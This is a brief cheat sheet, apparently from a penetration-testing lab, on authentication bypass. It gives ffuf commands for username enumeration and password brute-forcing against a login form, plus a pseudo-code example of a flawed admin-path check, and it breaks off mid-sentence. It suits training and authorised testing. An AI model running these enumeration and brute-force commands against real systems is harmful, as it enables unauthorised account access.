# <center>Authentication Bypass</center>

## Usernamr Enumeration
- ffuf -w {path to wordlist} -X POST -d "username=FUZZ&password=x" -H "Content-Type: application/x-www-form-urlencoded" -u {target's url} -mr "{message regex}"

## Bruteforce

### bruteforcing with ffuf
- ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200

## Logic Flaw

- example:
    ```php
        if( url.substr(0,6) === '/admin') {
        # Code to check user is an admin
        }
        else {
        # View Page
        }
    ```
    -> if